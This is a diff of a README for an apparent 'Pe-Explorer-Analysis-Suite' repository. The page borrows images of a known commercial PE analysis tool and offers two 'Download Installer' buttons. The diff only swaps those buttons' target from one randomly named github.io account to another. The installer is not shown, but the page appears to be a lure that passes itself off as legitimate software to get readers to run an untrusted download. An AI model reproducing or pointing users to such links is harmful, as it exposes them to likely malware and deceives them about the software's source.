@@ -4,7 +4,7 @@
   <img src="https://portableappz.x10.mx/img/apps/peexplorer596x270.png" alt="Program Logo"/>
 </div>
 
-[![Download Installer](https://img.shields.io/badge/Download_Installer-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://kiadravlandkxrbta.github.io/.github/Pe-Explorer-Analysis-Suite)
+[![Download Installer](https://img.shields.io/badge/Download_Installer-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://edgarnaomi4428.github.io/.github/Pe-Explorer-Analysis-Suite)
 
 ---
 
@@ -26,7 +26,7 @@ Finally, the Pe-Explorer-Analysis-Suite ecosystem is enhanced by an intuitive na
   <img src="https://www.heaventools.ru/img/pe-explorer-i2.png" alt="Program Interface Screenshot"/>
 </div>
 
-[![Download Installer](https://img.shields.io/badge/Download_Installer-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://kiadravlandkxrbta.github.io/.github/Pe-Explorer-Analysis-Suite)
+[![Download Installer](https://img.shields.io/badge/Download_Installer-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://edgarnaomi4428.github.io/.github/Pe-Explorer-Analysis-Suite)
 
 ---
 
